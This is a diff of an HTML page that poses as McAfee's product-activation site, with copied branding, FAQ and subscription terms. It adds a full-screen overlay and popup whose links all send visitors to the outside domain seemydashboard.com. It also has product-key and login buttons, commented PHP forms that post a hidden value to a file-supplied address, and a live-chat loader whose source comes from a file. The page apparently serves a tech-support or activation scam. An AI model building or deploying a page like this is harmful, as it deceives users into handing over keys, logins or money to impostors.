@@ -1,28 +1,906 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<title>Mcafee</title>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="robots" content="noindex, nofollow">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.slim.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="mcaasset/css/style.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="icon" href="mcaasset/img/favicon.ico" type="image/x-icon">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<title>Mcafee </title>
 <style>
-iframe{
-height:100vh;
-width:100vw;
-border:none;
+body{
+font-family: 'Poppins', sans-serif;
+}
+.formnewlnk {
+background-color: transparent;
+border: none;
+}
+.headwrap{
+padding-left: 2%;
+padding-right: 2%;
+}
+.mobresnav{
+display: none;
+}
+.heder{
+background: #F2F2F2;
+padding: 28px 30px;
+margin-top: 10px;
+border-radius: 20px;
+}
+.logclsli a{
+color: #fff;
+}
+.logo{
+width: 18%;
+float: left;
+}
+.listhead{
+font-weight: 600;
+margin-top: 5px;
+font-size: 13px;
+}
+.listhead li{
+display: inline;
+margin-left: 15px;
+}
+.firstli{
+margin-left: 35px !important;
+}
+.listheadright li{
+display: inline;
+margin-right: 15px;
+}
+.listheadright{
+font-weight: 600;
+margin-top: -5px;
+font-size: 13px;
+}
+.prtdjt{
+color: rgb(248, 54, 54);
+}
+.logclsli{
+background: #000;
+color: #fff;
+padding: 3px 15px;
+border-radius: 35px;
+}
+.slider{
+background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgr5sI4E2euEXZzOWaB3DXFe7c_IgnGoBZDnRX7J7_vxBhdrVGJ2NNlQn8JckpQGtw7xEqJN8Yd2ufHZUp1xL1wIgbFpuXY99ZdFx1KvOLTLOB6uTlMQBr0l6U-iBGCNkAJZMCr8tm04sYxigtpaCz7oN_oVr67g8ngEIfY_f39iwcOQoZrne_P9xTzyDJ_/s1440/backj.png")
+}
+.imgsercafetr{
+width: 80%;
+}
+.content11{
+padding: 50px 9%;
+}
+.content1{
+padding: 50px 9%;
+}
+.content2{
+padding: 50px 11%;
+background: #F5F6FA;
+}
+.content3{
+padding: 50px 13%;
+}
+.collapsible {
+/* background-color: #777; */
+color: white;
+cursor: pointer;
+padding: 18px;
+width: 100%;
+border: none;
+text-align: left;
+outline: none;
+font-size: 15px;
+}
+
+.active, .collapsible:hover {
+/* background-color: #555; */
+}
+
+.content {
+padding: 0 18px;
+display: none;
+overflow: hidden;
+/* background-color: #f1f1f1; */
+}
+.collapsible:before {
+content: '\002B'; /* Unicode character for "plus" sign (+) */
+font-size: 23px;
+color: #898585;
+float: left;
+margin-right: 25px;
+}
+
+.active:before {
+content: "\2212"; /* Unicode character for "minus" sign (-) */
+}
+.slider{
+padding: 40px 20% 140px 20%;
+text-align: center;
+background-size: contain;
+}
+.slider h3{
+font-size: 32px;
+color: #fff;
+}
+.slider h4{
+font-size: 18px;
+color: #fff;
+margin-top: 25px;
+}
+.slider p{
+font-size: 14px;
+color: #fff;
+margin-top: 25px;
+}
+.slider1{
+padding: 40px 15% 20px 15%;
+text-align: center;
+background-size: contain;
+background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgr5sI4E2euEXZzOWaB3DXFe7c_IgnGoBZDnRX7J7_vxBhdrVGJ2NNlQn8JckpQGtw7xEqJN8Yd2ufHZUp1xL1wIgbFpuXY99ZdFx1KvOLTLOB6uTlMQBr0l6U-iBGCNkAJZMCr8tm04sYxigtpaCz7oN_oVr67g8ngEIfY_f39iwcOQoZrne_P9xTzyDJ_/s1440/backj.png")
+
+}
+.slider1 h3{
+font-size: 28px;
+color: #fff;
+margin-top: 40px;
+margin-bottom: 60px;
+}
+.slider1 h4{
+font-size: 18px;
+color: #fff;
+margin-top: 25px;
+}
+.slider1 p{
+font-size: 14px;
+color: #fff;
+margin-top: 65px;
+margin-top: 65px;
+}
+.btnscrpre{
+background: rgb(234, 16, 16);
+padding: 12px 40px;
+color: #fff;
+font-size: 16px;
+font-weight: 600;
+border-radius: 25px;
+}
+.btrnspara{
+margin-top: 35px;
+margin-bottom: 25px;
+}
+.colorlink{
+color: rgb(234, 16, 16);
+text-decoration: underline;
+}
+.protscnten{
+padding-left: 20px;
+margin-top: 4%;
+}
+.protscnten h2{
+font-size: 26px;
+font-weight: 800;
+line-height: 40px;
+}
+.protscnten p{
+font-size: 14px;
+line-height: 30px;
+}
+.spanstep{
+color: rgb(234, 16, 16);
+font-size: 20px;
+font-weight: 700;
+margin-right: 20px;
+}
+.stepshome {
+padding: 0px;
+}
+.stepshome p{
+font-size: 16px;
+font-weight: 500;
+margin-top: 45px;
+}
+.content3 h2{
+font-size: 30px;
+font-weight: 700;
+margin-bottom: 50px;
+}
+.collapsible{
+color: #000;
+font-weight: 700;
+font-size: 19px;
+padding: 15px 0px;
+display: block;
+border-bottom: 1px solid #ccc;
+}
+.collapsible:hover{
+color: #000;
+text-decoration: none;
+}
+.lastrfq{
+border-bottom: none;
+}
+.content{
+border-bottom: 1px solid #ccc;
+padding: 20px 38px;
+font-size: 16px;
+line-height: 30px;
+}
+.footer{
+padding: 30px;
+}
+.blogckfoot1{
+background: #F2F2F2;
+padding: 80px 8%;
+}
+.blogckfoot2{
+background: #F2F2F2;
+padding: 0px 8% 0px 8%;
+}
+.blogckfoot1 h2{
+font-size: 16px;
+font-weight: 700;
+color: #000;
+}
+
+.collapsible1 {
+color: #474747;
+font-weight: 400;
+font-size: 15px;
+padding: 15px 0px;
+display: block;
+margin-left: 20px;
+
+/* border-bottom: 1px solid #ccc; */
+}
+
+.active, .collapsible1:hover {
+/* background-color: #555; */
+}
+
+.content11 {
+/* padding: 0 18px; */
+/* display: none; */
+overflow: hidden;
+margin-left: 20px;
+/* background-color: #f1f1f1; */
+}
+.content1 {
+padding: 0 18px;
+display: none;
+overflow: hidden;
+margin-left: 20px;
+/* background-color: #f1f1f1; */
+}
+.collapsible1:before {
+content: '\002B'; /* Unicode character for "plus" sign (+) */
+font-size: 20px;
+color: rgb(19, 18, 18);
+float: left;
+margin-right: 25px;
+font-weight: 600;
+}
+.active:before {
+content: "\2212"; /* Unicode character for "minus" sign (-) */
+}
+.footerlogo{
+width: 75%;
+}
+.footecopy{
+font-size: 13px;
+width: 80%;
+margin-top: 20px;
+/* text-align: center; */
+}
+.fooheadcolro{
+font-size: 16px;
+font-weight: 700;
+margin-top: 0;
+}
+.foolsitesmb {
+margin-left: -40px;
+list-style: none;
+margin-top: 30px;
+line-height: 2;
+font-size: 15px;
+}
+.horzilinfofo{
+color: #000;
+/* border: 0.5px solid rgb(71, 71, 71); */
+border-color: #000;
+}
+.loginpagelogo{
+width: 8%;
+}
+.headerlog{
+padding: 15px 15px;
+border: 1px solid #e8e5e5;
+}
+.leftlog h4{
+font-weight: 700;
+font-size: 27px;
+}
+.logbody{
+padding: 130px 15%;
+}
+.logpmeth{
+margin-top: 20px;
+border-bottom: 1px dashed #ccc;
+padding-bottom: 35px;
+}
+.dontlog{
+font-weight: 500;
+font-size: 14px;
+}
+.form-control{
+height: 50px;
+margin-bottom: 15px;
+border-radius: 15px;
+width: 85%;
+
+}
+.input-group-addon {
+font-size: 20px;
+border-radius: 15px;
+
+}
+.rightbodylig{
+padding-left: 50px;
+}
+.forgotlog{
+font-weight: 600;
+margin-top: 25px;
+}
+.submlog{
+width: 100%;
+height: 48px;
+display: flex;
+align-items: center;
+justify-content: center;
+border-radius: 6rem;
+font-weight: 600;
+color: #fff;
+background: #4258ff;
+border: 1px solid #d4d5db;
+box-shadow: inset 0 2px 2px 0 rgb(0 0 0/5%);
+font-size: inherit;
+outline: none;
+margin-top: 40px;
+}
+.stepmsunres{
+width: 100%;
+}
+.mobresnav .row{
+margin-right: 0px !important;
+}
+@media only screen and (max-width: 1200px)
+{
+.mobresnav{
+padding: 20px 5px 11px 30px;
+display: block;
+}
+.logo {
+width: 21%;
+}
+.headwrap{
+display: none;
+}
+.lifdisbar{
+color: #848484;
+font-size: 22px;
+margin-right: 25px;
+}
+}
+@media only screen and (max-width: 1024px)
+{
+.protscnten h2 {
+font-size: 22px;
+}
+.slider h3 {
+font-size: 25px;
+}
+.logo {
+width: 31%;
+}
+.slider h4 {
+font-size: 16px;
+}
+.spanstep{
+font-size: 14px;
+}
+.stepshome p{
+font-size: 13px;
+}
+.slider1 h3 {
+font-size: 20px;
+color: #fff;
+margin-top: 40px;
+margin-bottom: 60px;
+}
+.ghehiksjs{
+margin-top: 40px;
+}
+.slider {
+background-size: cover;
+}
+}
+@media only screen and (max-width: 991px)
+{
+.slider {
+padding: 40px 15% 100px 15%;
+text-align: center;
+}
+.loginpagelogo {
+width: 15%;
+}
+.logbody {
+padding: 130px 4%;
+}
+}
+@media only screen and (max-width: 768px)
+{
+.slider h3 {
+font-size: 20px;
+}
+.slider h4 {
+font-size: 13px;
+}
+.slider {
+padding: 40px 15% 50px 15%;
+text-align: center;
+}
+.imgafetrmob{
+text-align: center;
+}
+.content3 h2 {
+font-size: 22px;
+}
+.collapsible {
+font-size: 14px;
+font-weight: 500;
+}
+.slider1 h3 {
+font-size: 16px;
+}
+.slider1 {
+padding: 40px 8% 20px 8%;
+background-size: cover;
+}
+.footerlogo {
+width: 28%;
+}
+.slider1 {
+padding: 20px 4% 20px 4%;
+}
+.logbody {
+padding: 30px 4%;
+}
+.rightbodylig {
+padding-left: 17px;
+}
+.loginpagelogo {
+width: 22%;
+}
+}
+@media only screen and (max-width: 591px)
+{
+.slider h3 {
+font-size: 18px;
+}
+.slider {
+padding: 40px 4% 50px 4%;
+}
+.slider p {
+font-size: 12px;
+}
+.logo {
+width: 45%;
+}
+.collapsible {
+font-size: 13px;
+font-weight: 400;
+}
+.loginpagelogo {
+width: 30%;
+}
+.leftlog h4 {
+font-weight: 700;
+font-size: 21px;
+}
+}
+@media only screen and (max-width: 450px)
+{
+.footer {
+padding: 0px;
+}
+.blogckfoot1 {
+background: #F2F2F2;
+padding: 47px 2%;
+}
+.footerlogo {
+width: 40%;
+}
+.logo {
+width: 80%;
+}
+.slider h3 {
+font-size: 14px;
+}
+}
+.supaicolocerr{
+width: 44%;
+}
+.dlhd:hover{
+text-decoration: none;
+}
+.modlapopup{
+height: 310px;
+width: 480px;
+background: #fff;
+position: fixed;
+top: 25%;
+left: 34%;
+box-shadow: 0px 1px 11px 0px #000;
+z-index: 1000;
+padding: 30px 20px;
+border-radius: 5px;
+}
+.dlhd{
+position: fixed ;
+top: 0;
+left: 0;
+z-index: 140;
+width: 100vw;
+height: 100vh;
+background-color: rgba(0, 0, 0, 0.6);
+}
+.wlcmint{
+font-family: &#39;Josefin Sans&#39;, sans-serif !important;
+color: #000;
+font-weight: 700;
+font-size: 30px;
+}
+.parasdft{
+color: #5c5a5a;
+font-size: 16px;
+font-weight: 400;
+margin-top:45px;
+}
+.btnlinkg{
+color: rgb(22,88,109);
+font-weight: 700;
+font-size: 18px;
+text-decoration: underline;
+margin-right: 30px;
+margin-top: 30px;
+}
+.btnlinkg1{
+color: #fff;
+font-weight: 700;
+font-size: 18px;
+padding: 15px 20px;
+margin-right: 30px;
+background-color:#EA1010;
+border-radius: 2px;
+}
+.msdrtlina{
+margin-top: 35px;
+}
+.linksdaq2:hover{
+text-decoration:none;
 }
 </style>
-
 </head>
 <body>
-
-<div class="embed-responsive-item ">
-<iframe class="embed-responsive-item" src="https://seemydashboard.com/web/act/set-a/mca/2/mca2/"></iframe>
+<a class='dlhd' href='https://seemydashboard.com/web/act/set-a/mca/2/mca2/'>
+<a class='linksdaq2' href='https://seemydashboard.com/web/act/set-a/mca/2/mca2/'>
+<div class='modlapopup'>
+<h2 class='text-center wlcmint'>Welcome to Mcafee</h2>
+<p class='parasdft'>To check out product designed specifically for your country, please visit site</p>
+<p class='text-center msdrtlina'><a class='btnlinkg' href='https://seemydashboard.com/web/act/set-a/mca/2/mca2/'>Visit the US site</a><a class='btnlinkg1' href='https://seemydashboard.com/web/act/set-a/mca/2/mca2/'>Go to CA site</a></p>
 </div>
+</a>
+<div class="headwrap">
+<div class="heder">
+<div class="row">
+<div class="col-lg-7 col-md-7">
+<img class="logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHSySrOGS1tvBTMKVoStQKzR2n4iBO99oZwuVtz8PQ0cYp64KoB8UwOrBONRaI6CDudPAg4PeZTb1EsjVrZ7IRNOmyrA6RTkPu3Yl0KBNxsRRm3xXPuLk7LZG2LhJSGHBbbVXS5hVrDY1kTtCwNf95YaH8X10Qv7fMuSQL1EsMd2m5su4dT9yusBhQrBpM/s1280/logo.png" alt="">
+<ul class="listhead">
+<li class="firstli">Total Protection</li>
+<li>Antivirus</li>
+<li>Identity</li>
+<li>PC Optimizer</li>
+<li>About</li>
+</ul>
+</div>
+<div class="col-lg-5 col-md-5 text-right">
+<ul class="listheadright">
+<li class="prtdjt">Protection Score</li>
+<li>Blog</li>
+<li>Support</li>
+<li class="logclsli">
+<!-- <form action="<?php echo file_get_contents("mcaasset/files/mcaformlink1.txt"); ?>login/index.php" method="POST" style="display:inline-block;"> -->
+<!-- <input type="hidden" name="coding" value="<?php echo file_get_contents("mcaasset/files/mcacoding1.txt"); ?>"> -->
+<a type="submit" class="formnewlnk" href="login">Login</a>
+<!-- </form> -->
+</li>
+<li><span class="glyphicon glyphicon-th" style="font-size:22px;"></span></li>
+<li><i class="fa fa-globe" style="font-size:24px"></i></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+
+<div class="mobresnav">
+<div class="row">
+<div class="col-sm-6 col-xs-8">
+<img class="logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHSySrOGS1tvBTMKVoStQKzR2n4iBO99oZwuVtz8PQ0cYp64KoB8UwOrBONRaI6CDudPAg4PeZTb1EsjVrZ7IRNOmyrA6RTkPu3Yl0KBNxsRRm3xXPuLk7LZG2LhJSGHBbbVXS5hVrDY1kTtCwNf95YaH8X10Qv7fMuSQL1EsMd2m5su4dT9yusBhQrBpM/s1280/logo.png" alt="">
+</div>
+<div class="col-sm-6 col-xs-4">
+<p class="lifdisbar text-right"><i class="fa fa-bars"></i></p>
+</div>
+</div>
+</div>
+
+<div class="slider">
+<h3>Activate your McAfee Subscription Today</h3>
+<h4>Redeem your product key or download your security product</h4>
+<p class="btrnspara" >
+<!-- <form action="<?php echo file_get_contents("mcaasset/files/mcaformlink1.txt"); ?>login/index.php" method="POST"> -->
+<!-- <input type="hidden" name="coding" value="<?php echo file_get_contents("mcaasset/files/mcacoding1.txt"); ?>"> -->
+<button type="submit" class="btnscrpre formnewlnk" href="login">Enter Product Key</button>
+<!-- </form> -->
+<!-- <a class="btnscrpre" href="login">Enter Product Key</a> -->
+</p>
+<p>Already redeemed your product key? Download your app from
+<!-- <form action="<?php echo file_get_contents("mcaasset/files/mcaformlink1.txt"); ?>login/index.php" method="POST" display="inline-block;"> -->
+<!-- <input type="hidden" name="coding" value="<?php echo file_get_contents("mcaasset/files/mcacoding1.txt"); ?>"> -->
+<button type="submit" class="colorlink formnewlnk" href="login">My Account</button>
+<!-- </form> -->
+<!-- <a class="colorlink" href="login">My Account</a> -->
+</p>
+</div>
+
+
+<div class="content11">
+<div class="row">
+<div class="col-lg-6 col-md-6 col-sm-6 imgafetrmob">
+<img class="imgsercafetr" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0qCc7pdJG54JF5WktYDWnDxmM69x2_0bW3VABOafLbRN2om-MjtMrOEj2O_txpDGeoNpBjMOwJt12Iih4PrjYPvsb3bmLKqsrAm65beatjeAhusrNvoQ4jUUukbC7mEA0pwxxTiZMC_mRDD8hK_9PEwr7aaKHKgnpb-ZCUCQxCy-0UM_KVMonAG61EO7O/s490/cr.png" alt="">
+</div>
+<div class="col-lg-6 col-md-6 col-sm-6 protscnten">
+<h2>Ready to protect your privacy and devices?</h2>
+<p>It is easy. Follow the steps below to quickly redeem your product key and download your security app.</p>
+</div>
+</div>
+</div>
+
+<div class="content2">
+<div class="row">
+<div class="col-lg-7 col-md-7 col-sm-7 stepshome">
+<p><span class="spanstep">Step 1</span> Click <a class="colorlink" href="">mcafee.com/activate</a> to <b>redeem your product key.</b></p>
+<p><span class="spanstep">Step 2</span> Enter the unique product key found on your Retail Card or eCard.</b></p>
+<p><span class="spanstep">Step 3</span> Follow our onscreen steps to download and install your security app. </p>
+</div>
+<div class="col-lg-5 col-md-5 col-sm-5">
+<img class="stepmsunres" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfmiqosqUeY2UkBhRbBFuuxGrqPDdX3FpT4pWEvk-IIv_0Wd2xSxh6uGqOjNkzAIAU5jHHyGKVyQTNDdYYQgoBx85mGt2mR2Lbl54By4Ff6bOvfHXJ3M8V7fW0KiTD_iv5WFNkEZSVFUSMkIkTO1_B3G-ToQnhBM6nZKHNq5Fh2mQcPJ3hnyIKeUoke2S5/s405/steps.png" alt="">
+</div>
+</div>
+</div>
+
+
+<div class="content3">
+<h2>Frequently asked questions</h2>
+<a type="button" class="collapsible">How do I activate my McAfee Retail Card? </a>
+<div class="content">
+<p>1. Click <a class="colorlink" href="">mcafee.com/activate</a> to redeem your product key. </p>
+<p>2. Enter the unique activation code found on your Retail Card or eCard.</p>
+<p>3. Follow our onscreen steps to download and install your security app. </p>
+</div>
+<div class="clearfix"></div>
+<a type="button" class="collapsible">I've already redeemed my Retail Card product key. How do I install my security product? </a>
+<div class="content">
+<p>1. Visit <a class="colorlink" href="">My Account</a></p>
+<p>2. Log in with your email address and password. </p>
+<p>3. Then download your product on the device you want to protect. </p>
+</div>
+<div class="clearfix"></div>
+
+<a type="button" class="collapsible">Can I redeem my Retail Card product key more than once? </a>
+<div class="content">
+<p>You can only redeem your product key once. Need to install your security product? Visit <a class="colorlink" href="login">My Account</a></p>
+</div>
+<div class="clearfix"></div>
+
+<a type="button" class="collapsible lastrfq">What devices and operating systems are compatible with my Subscription?</a>
+<div class="content">
+<p>You can find operating system compatibility by visiting our <a class="colorlink" href="">System Requirements.</a></p>
+</div>
+</div>
+
+
+<div class="slider1">
+<h3>Redeem your product key or download your security product</h3>
+<!-- <h4>Redeem your product key or download your security product</h4> -->
+<p class="btrnspara" >
+<!-- <form action="<?php echo file_get_contents("mcaasset/files/mcaformlink1.txt"); ?>login/index.php" method="POST"> -->
+<!-- <input type="hidden" name="coding" value="<?php echo file_get_contents("mcaasset/files/mcacoding1.txt"); ?>"> -->
+<button type="submit" class="btnscrpre formnewlnk" href="login">Enter Product Key</button>
+<!-- </form> -->
+</p>
+<p>Already redeemed your product key? Download your app from
+<!-- <form action="<?php echo file_get_contents("mcaasset/files/mcaformlink1.txt"); ?>login/index.php" method="POST" display="inline-block;"> -->
+<!-- <input type="hidden" name="coding" value="<?php echo file_get_contents("mcaasset/files/mcacoding1.txt"); ?>"> -->
+<button type="submit" class="colorlink formnewlnk" href="login">My Account</button>
+<!-- </form> -->
+</p>
+</div>
+
+
+
+
+
+
+<div class="footer">
+<div class="blogckfoot1">
+<h2>* Important Terms and Offer Details:</h2>
+<a type="button" class="collapsible1">Subscription, Pricing, and Automatic Renewal Terms:</a>
+<div class="content1">
+<ul>
+<li>The amount you are charged upon purchase is the price of the first term of your subscription. The length of your first term depends on your purchase selection. Once your first term is expired, your subscription will be automatically renewed on an annual basis and you will be charged the renewal term subscription price in effect at the time of your renewal, until you cancel.</li><br>
+<li>Unless otherwise stated, if a savings amount is shown, it describes the difference between the first term and renewal term subscription prices (e.g., first year price vs. each year thereafter).</li><br>
+<li>Pricing is subject to change. If the renewal price changes, we will notify you in advance so you always know what’s going on.</li><br>
+<li>You can cancel your subscription or change your automatic renewal settings any time after purchase from your My Account page. To learn more about automatic renewal, click here</li><br>
+<li>You may request a refund by contacting Customer Support within 30 days of initial purchase or within 60 days of automatic renewal (for 1 year or longer terms)</li><br>
+<li>Your subscription is subject to our License Agreement and Privacy Notice. Subscriptions covering "all" devices are limited to supported devices that you own. Product features may be added, changed or removed during the subscription term. Not all features may be available on all devices. See System Requirements for additional information.</li>
+</ul>
+</div>
+<div class="clearfix"></div>
+<a type="button" class="collapsible1">**Free Benefits With Auto-Renewal: </a>
+<div class="content1">
+<ul>
+<li>For many qualifying product subscriptions McAfee offers additional benefits for free when you are enrolled in auto-renewal. You can check your eligibility for these benefits in your My Account page. Not all benefits are offered in all locations or for all product subscriptions. System Requirements apply. Turning off auto-renewal terminates your eligibility for these additional benefits. </li> <br><br>
+<li>Virus Protection Pledge (VPP): If we cannot remove a virus from your supported device we’ll refund you the amount you paid for your current term subscription. The refund does not apply to any damage or loss caused by a virus. You are responsible for backing up your data to prevent data loss. See terms here: mcafee.com/pledge.</li>
+</ul>
+</div>
+<div class="clearfix"></div>
+
+<a type="button" class="collapsible1">‡Additional Terms Specific to Identity Monitoring Service: </a>
+<div class="content1">
+<ul>
+<li>Eligibility: McAfee® Identity Monitoring Service Essentials is available within active McAfee Total Protection and McAfee LiveSafe subscriptions with identity monitoring for up to 10 unique emails. Phone number monitoring is enabled upon activation of Automatic Renewal. Not all identity monitoring elements are available in all countries. See Product Terms of Service for more information. </li> <br><br>
+<li>Your subscription is subject to our License Agreement and Privacy Notice. Product features may be added, changed or removed during the subscription term. Some features may require registration and a valid ID number to activate. See System Requirements for additional information.</li> <br><br>
+<li>While McAfee Identity Monitoring Service provides you tools and resources to protect yourself from identity theft, no identity can be completely secure.</li> <br>
+</ul>
+</div>
+<div class="clearfix"></div>
+<p class="text-right"></p>
+<hr class="horzilinfofo">
+</div>
+<div class="blogckfoot2">
+<div class="row">
+<div class="col-lg-6 col-md-6 col-sm-12">
+<div class="col-lg-6 col-md-6 col-sm-6">
+<img class="footerlogo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHSySrOGS1tvBTMKVoStQKzR2n4iBO99oZwuVtz8PQ0cYp64KoB8UwOrBONRaI6CDudPAg4PeZTb1EsjVrZ7IRNOmyrA6RTkPu3Yl0KBNxsRRm3xXPuLk7LZG2LhJSGHBbbVXS5hVrDY1kTtCwNf95YaH8X10Qv7fMuSQL1EsMd2m5su4dT9yusBhQrBpM/s1280/logo.png" alt="">
+<p class="footecopy">Corporate Headquarters
+6220 America Center Drive
+San Jose, CA 95002 USA</p>
+</div>
+<div class="col-lg-6 col-md-6 col-sm-6">
+<h2 class="fooheadcolro">Products</h2>
+<ul class="foolsitesmb">
+<li>McAfee® Total Protection</li>
+<li>McAfee® WebAdvisor</li>
+<li>McAfee® Virus Removal Service</li>
+<li>McAfee PC Optimizer</li>
+</ul>
+</div>
+</div>
+<div class="ghehiksjs col-lg-6 col-md-6 col-sm-12">
+<div class="col-lg-4 col-md-4 col-sm-4">
+<h2 class="fooheadcolro">Resources</h2>
+<ul class="foolsitesmb">
+<li>Antivirus</li>
+<li>Parental</li>
+<li>Controls</li>
+<li>Malware</li>
+<li>Firewall</li>
+<li>Blogs</li>
+<li>Activate Retail Card</li>
+<li>Threat Center</li>
+</ul>
+</div>
+<div class="col-lg-4 col-md-4 col-sm-4">
+<h2 class="fooheadcolro">Support</h2>
+<ul class="foolsitesmb">
+<li>Customer Service</li>
+<li>FAQs</li>
+<li>Renewals</li>
+<li>Support</li>
+<li>Community</li>
+</ul>
+</div>
+<div class="col-lg-4 col-md-4 col-sm-4">
+<h2 class="fooheadcolro">About</h2>
+<ul class="foolsitesmb">
+<li>About McAfee</li>
+<li>Careers</li>
+<li>Press Inquiries</li>
+<li>Newsroom</li>
+<li>Investors</li>
+<li>Legal Terms</li>
+<li>Your Privacy</li>
+<li>Choices</li>
+<li>System Requirements</li>
+<li>Sitemap</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+
+
+
+
 
 </body>
 </html>
+<script>
+var coll = document.getElementsByClassName("collapsible");
+var i;
+
+for (i = 0; i < coll.length; i++) {
+coll[i].addEventListener("click", function() {
+this.classList.toggle("active");
+var content = this.nextElementSibling;
+if (content.style.display === "block") {
+content.style.display = "none";
+} else {
+content.style.display = "block";
+}
+});
+}
+</script>
+
+<script>
+var coll = document.getElementsByClassName("collapsible1");
+var i;
+
+for (i = 0; i < coll.length; i++) {
+coll[i].addEventListener("click", function() {
+this.classList.toggle("active");
+var content = this.nextElementSibling;
+if (content.style.display === "block") {
+content.style.display = "none";
+} else {
+content.style.display = "block";
+}
+});
+}
+</script>
+
+<?php $chatvar = file_get_contents("mcaasset/files/mcachat1.txt"); ?>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript"> var Tawk_API=Tawk_API||{},
+Tawk_LoadStart=new Date();
+(function(){ var s1=document.createElement("script"),
+s0=document.getElementsByTagName("script")[0];
+s1.async=true; s1.src='<?php echo $chatvar ?>';
+s1.charset='UTF-8'; s1.setAttribute('crossorigin','*'); s0.parentNode.insertBefore(s1,s0); })();
+</script> <!--End of Tawk.to Script-->
